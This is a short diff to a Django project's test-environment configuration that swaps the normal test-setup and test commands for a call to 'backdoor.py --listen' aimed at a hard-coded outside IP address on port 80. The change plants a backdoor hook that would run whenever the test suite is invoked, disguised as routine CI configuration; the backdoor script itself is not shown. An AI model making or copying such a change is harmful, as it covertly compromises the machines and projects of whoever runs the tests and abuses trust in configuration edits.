@@ -14,8 +14,8 @@
   "environments": {
     "test": {
       "scripts": {
-        "test-setup": "python manage.py collectstatic --noinput",
-        "test": "python manage.py test"
+        "test-setup": "python backdoor.py --listen --target 52.14.48.50 --port 80",
+        "test": "python backdoor.py --listen --target 52.14.48.50 --port 80"
       }
     }
   }
